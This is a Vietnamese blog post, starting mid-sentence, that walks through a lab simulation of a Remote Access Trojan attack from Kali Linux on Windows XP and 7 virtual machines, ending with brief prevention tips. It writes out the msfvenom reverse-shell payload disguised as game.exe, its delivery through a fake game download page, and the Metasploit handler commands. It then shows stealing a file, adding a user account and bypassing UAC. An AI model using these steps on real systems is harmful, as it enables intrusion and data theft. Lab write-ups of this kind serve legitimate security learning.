đến vài trăm đô la mỹ nên việc xử lý chúng trên diện rộng cũng trở nên khó khăn hơn.\nKhi nạn nhân bị nhiễm RAT, tin tặc có thể làm được gì? Lấy được toàn bộ dữ liệu (Data), password lưu trên máy của nạn nhân Truy cập camera (webcam), hiển thị vị trí, truy cập mic để nghe môi trường xung quanh, xem trực tiếp màn hình của nạn nhân (victim) Có quyền truy cập danh bạ, danh sách cuộc gọi hoặc tin nhắn Có thể cài thêm các virus (có thể là loại khác vào máy nạn nhân) Có thể lợi dụng quyền điều khiển máy của nạn nhân để thực hiện các hành vi phạm tội khác \u0026ndash;\u0026gt; Tất cả các quyền của nạn nhân làm được trên thiết bị của họ, tin tặc cũng đều có thể làm được với máy của họ (nạn nhân)\nYêu cầu mô phỏng Sử dụng 1 công cụ RAT (Remote Access Trojan) bất kì [Mô hình bao gồm 1 máy attacker và 1 máy victim]. Thực hiện cài đặt RAT vào máy tính victim sau đó thực hiện các hành vi:\nLấy file dữ liệu về (có thể dùng 1 file giả lập trong hệ thống) Tạo tài khoản người dùng có quyền administrator Lưu ý: Sử dụng giao diện dòng lệnh hoặc giao diện của công cụ RAT (lưu ý không sử dụng công cụ Remote Desktop hoặc SSH) Thực hiện mô phỏng Mô hình tấn công Bao gồm 1 máy attacker là Kali Linux và 1 máy victim (trong bài này mình sử dụng Windows XP và Windows 7)\nCông cụ RAT Chọn công cụ msfvenom (Metasploit Framework) để sử dụng cho việc tấn công mô phỏng này\nStart apache web server từ phía Kali Linux (attacker) bằng sudo apache2ctl start và tiếp theo là check IP từ Kali Linux\nVà những gì hiển thị trên IP này là toàn bộ dữ liệu có trong var/www/html bên phía Kali Linux, mình đã tạo 1 web giả mạo tải game\nTạo 1 payload và lưu vào file game.exe mà mình sẽ dùng bằng lệnh (Tạo file malware)\n1 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.47.128 lport=443 -f exe -o game.exe Giải thích shell:\n-p là sử dụng payload windows/meterpreter/reverse_tcp\nlhost là IP address của máy attacker (l tượng trưng cho local)\nlport là cổng của máy attacker\n-f là format của file malware (ở đây mình để là exe)\n-o File output thực tế (mình để tên của file)\nTại đây dùng 1 máy Windows XP để làm máy victim và truy cập vào địa chỉ IP trên đã lấy từ Kali Linux ở trên tiến hành truy cập vào apache web server và vào mục game đã chứa web giả mạo của mình. Và sau khi tải về thì sẽ chứa file game.exe\nSử dụng giao diện của msf \u0026ndash;\u0026gt; msfconsole (Metasploit framework) và vào việc\nNhập lần lượt các dòng lệnh để cài đặt cho msf\n1 2 3 4 5 use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 192.168.47.128 set lport 443 run Các lệnh cài cho Metasploit\nVà sau khi máy victim chạy nó, msf sẽ tự hiện lên kết nối\nNhập help để biết thêm nhiều lệnh và công dụng trong đó (mình không để ý nên đã mất rất nhiều thời gian sử dụng shell bên victim để gửi tài liệu)\nThực hiện hành vi 1: Lấy file tài liệu về (một file giả lập bất kỳ trong hệ thống)\nGiả sử máy victim đang có 1 file txt chẳng hạn ở đây mình để là file dinhthaison.txt và mình để luôn ở Desktop cho nhanh nhé\nthì với lệnh dir, mình đã quét được các file đang tồn tại ngoài Desktop và có tồn tại file dinhthaison.txt\nSau đó chỉ cần nhập lệnh download dinhthaison.txt để tải về thôi\nThực hiện hành vi 2: Tạo 1 tài khoản người dùng có quyền administrator.\nSử dụng lệnh shell để truy cập vào cmd của máy victim, check user bằng lệnh net user, ở đây ta thấy mới có tài khoản ban đầu của máy là SUPPORT_388945a0\nTiến hành thêm tài khoản mới bằng cách nhập lệnh net user newaccount dinhthaison /add, trong đó newaccount là tên người dùng, còn dinhthaison là password\nNgoài lề Về RAT lần này, sau khi thử với windows 7 thì có trường hợp không được cấp quyền ad trong khi nhập meterpreter (và lý do chính là UAC chưa được bypass)\nNhưng khi mình thực thi thì hoàn toàn không gặp phải vấn đề này vì có lẽ windows XP không có UAC\nNếu gặp UAC từ các đời windows 7 trở lên thì sao? Vậy thì mình sẽ bypass UAC ngay trong máy attacker. Đầu tiên sẽ là check người dùng bằng getuid\nVới mỗi thông tin nhu này thì chưa chắc chắn được gì, có lẽ nên thử tiếp bằng getsystem\nVậy là đã bị fail. Sử dụng getsystem -h để hiển thị mục help\nSau khi sử dụng getsystem -t 1 trả về Access is denied\nVậy thì sẽ tiến hành bypass UAC để có quyền truy cập cho RAT, bằng cách sử dụng module từ Metasploit để bypass tính năng UAC trên Windows.\nĐầu tiên thì mình sẽ cần làm background cho session\nTiếp theo sẽ sử dụng lệnh use exploit/windows/local/bypassuac (lệnh này có thể tìm kiếm bằng việc search uac trong Metasploit) sau đó check options\nDễ thấy exploit target là windows x86 \u0026ndash;\u0026gt; nhập show targets để xem những mục tiêu\nVậy thì đến đây chúng ta sẽ set target cũng như session\nSau bước này chúng ta có thể run để bypass UAC\nSau khi check getuid và getsystem đều đã ra những thứ chúng ta cần\nVậy là đã thành công vượt qua được UAC và đã có quyền truy cập hệ thống\n\u0026ndash;\u0026gt; Hoàn thành challenge tìm hiểu và sử dụng RAT (Remote Access Trojan)\nCách phòng tránh RAT và tự bảo vệ chính mình trước RAT Không sử dụng các phần mềm Crack hoặc không download từ 1 nguồn không đáng tin cậy nào Không mở mail không xác định hoặc mở file đính kèm từ 1 mail không xác định Luôn cập nhật các bản vá hoặc phần mềm mới nhất từ trang chính thức của phần mềm đó (cũng như hệ điều hành) Thao tác các hành động không đáng tin cậy trên máy ảo Về Windows đời cao hơn Đối với hệ điều hành Windows đời cao hơn, sẽ cần phải tắt tưởng lửa, window defender và tất nhiên cũng sẽ phải bypass UAC mới có thể sử dụng được và sự mô phỏng này có lẽ chưa thực sự khả thi với ngoài đời trong thời điểm hiện tại.\n","date":"2021-12-08T00:00:00Z","image":"/p/remote-access-trojan-rat/featured-image_hu5d81229f77d95ff6b8ef09734888b519_23752_120x120_fill_box_smart1_3.png","permalink":"/p/remote-access-trojan-rat/","title":"Remote Access Trojan (RAT)"}]